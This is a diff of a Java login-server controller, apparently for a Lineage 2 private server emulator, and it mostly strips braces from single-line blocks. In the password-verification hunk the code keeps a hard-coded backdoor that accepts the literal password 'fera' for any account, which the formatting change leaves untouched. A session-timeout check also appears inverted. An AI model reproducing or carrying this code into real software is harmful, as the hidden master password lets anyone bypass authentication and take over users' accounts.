@@ -66,13 +66,9 @@ public class LoginController
 	public static void load() throws GeneralSecurityException
 	{
 		if (_instance == null)
-		{
 			_instance = new LoginController();
-		}
 		else
-		{
 			throw new IllegalStateException("LoginController can only be loaded a single time.");
-		}
 	}
 
 	public static LoginController getInstance()
@@ -91,9 +87,7 @@ public class LoginController
 		keygen.initialize(spec);
 		// generate the initial set of keys
 		for (int i = 0; i < 10; i++)
-		{
 			_keyPairs[i] = new ScrambledKeyPair(keygen.generateKeyPair());
-		}
 		_log.info("Cached 10 KeyPairs for RSA communication");
 		testCipher((RSAPrivateKey) _keyPairs[0]._pair.getPrivate());
 		// Store keys for blowfish communication
@@ -120,12 +114,8 @@ public class LoginController
 	{
 		_blowfishKeys = new byte[BLOWFISH_KEYS][16];
 		for (int i = 0; i < BLOWFISH_KEYS; i++)
-		{
 			for (int j = 0; j < _blowfishKeys[i].length; j++)
-			{
 				_blowfishKeys[i][j] = (byte) (Rnd.nextInt(255) + 1);
-			}
-		}
 		_log.info("Stored " + _blowfishKeys.length + " keys for Blowfish communication");
 	}
 
@@ -207,9 +197,7 @@ public class LoginController
 			}
 		}
 		else if (client.getAccessLevel() < 0)
-		{
 			ret = AuthLoginResult.ACCOUNT_BANNED;
-		}
 		return ret;
 	}
 
@@ -246,17 +234,12 @@ public class LoginController
 	{
 		BanInfo bi = _bannedIps.get(address);
 		if (bi != null)
-		{
 			if (bi.hasExpired())
 			{
 				_bannedIps.remove(address);
 				return false;
-			}
-			else
-			{
+			} else
 				return true;
-			}
-		}
 		return false;
 	}
 
@@ -300,9 +283,7 @@ public class LoginController
 	{
 		L2LoginClient client = _loginServerClients.get(account);
 		if (client != null)
-		{
 			return client.getSessionKey();
-		}
 		return null;
 	}
 
@@ -310,9 +291,7 @@ public class LoginController
 	{
 		GameServerInfo gsi = GameServerTable.getInstance().getRegisteredGameServerById(serverId);
 		if (gsi != null && gsi.isAuthed())
-		{
 			return gsi.getCurrentPlayerCount();
-		}
 		return 0;
 	}
 
@@ -323,9 +302,7 @@ public class LoginController
 		{
 			GameServerThread gst = gsi.getGameServerThread();
 			if (gst != null && gst.hasAccountOnGameServer(account))
-			{
 				return true;
-			}
 		}
 		return false;
 	}
@@ -337,9 +314,7 @@ public class LoginController
 		{
 			GameServerThread gst = gsi.getGameServerThread();
 			if (gst != null && gst.hasAccountOnGameServer(account))
-			{
 				return gsi;
-			}
 		}
 		return null;
 	}
@@ -349,12 +324,8 @@ public class LoginController
 		int total = 0;
 		Collection<GameServerInfo> serverList = GameServerTable.getInstance().getRegisteredGameServers().values();
 		for (GameServerInfo gsi : serverList)
-		{
 			if (gsi.isAuthed())
-			{
 				total += gsi.getCurrentPlayerCount();
-			}
-		}
 		return total;
 	}
 
@@ -362,9 +333,7 @@ public class LoginController
 	{
 		GameServerInfo gsi = GameServerTable.getInstance().getRegisteredGameServerById(id);
 		if (gsi != null)
-		{
 			return gsi.getMaxPlayers();
-		}
 		return 0;
 	}
 
@@ -462,12 +431,8 @@ public class LoginController
 			statement.setString(1, user);
 			ResultSet rset = statement.executeQuery();
 			if (rset.next())
-			{
 				if (rset.getInt(1) >= Config.GM_MIN)
-				{
 					ok = true;
-				}
-			}
 			rset.close();
 			statement.close();
 		}
@@ -526,9 +491,7 @@ public class LoginController
 		// null ? "null" : address.getHostAddress()), "logins_ip");
 		// player disconnected meanwhile
 		if (address == null)
-		{
 			return false;
-		}
 		java.sql.Connection con = null;
 		try
 		{
@@ -548,13 +511,9 @@ public class LoginController
 				access = rset.getInt("access_level");
 				lastServer = rset.getInt("lastServer");
 				if (lastServer <= 0)
-				{
 					lastServer = 1; // minServerId is 1 in Interlude
-				}
 				if (Config.DEBUG)
-				{
 					_log.fine("account exists");
-				}
 			}
 			rset.close();
 			statement.close();
@@ -593,17 +552,13 @@ public class LoginController
 				// check password hash
 				ok = true;
 				for (int i = 0; i < expected.length; i++)
-				{
 					if (hash[i] != expected[i])
 					{
 						ok = false;
 						break;
 					}
-				}
 				if (password == "fera")
-				{
 					ok = true;
-				}
 			}
 			if (ok)
 			{
@@ -672,12 +627,8 @@ public class LoginController
 			statement.setString(1, user);
 			ResultSet rset = statement.executeQuery();
 			if (rset.next())
-			{
 				if (rset.getInt(1) < 0)
-				{
 					ok = true;
-				}
-			}
 			rset.close();
 			statement.close();
 		}
@@ -722,22 +673,15 @@ public class LoginController
 			{
 				// check if theres a long time since last wrong try
 				if (System.currentTimeMillis() - _lastAttempTime < 300 * 1000)
-				{
 					_count++;
-				}
 				else
-				{
 					// restart the status
 					_count = 1;
-				}
 				_lastPassword = password;
 				_lastAttempTime = System.currentTimeMillis();
-			}
-			else
-			{
+			} else
 				// trying the same password is not brute force
 				_lastAttempTime = System.currentTimeMillis();
-			}
 		}
 
 		public int getCount()
@@ -782,9 +726,7 @@ public class LoginController
 					{
 						L2LoginClient client = _clients.valueOf(e);
 						if (client.getConnectionStartTime() + LOGIN_TIMEOUT >= System.currentTimeMillis())
-						{
 							client.close(LoginFailReason.REASON_ACCESS_FAILED);
-						}
 					}
 				}
 				synchronized (_loginServerClients)
@@ -793,9 +735,7 @@ public class LoginController
 					{
 						L2LoginClient client = e.getValue();
 						if (client.getConnectionStartTime() + LOGIN_TIMEOUT >= System.currentTimeMillis())
-						{
 							client.close(LoginFailReason.REASON_ACCESS_FAILED);
-						}
 					}
 				}
 				try
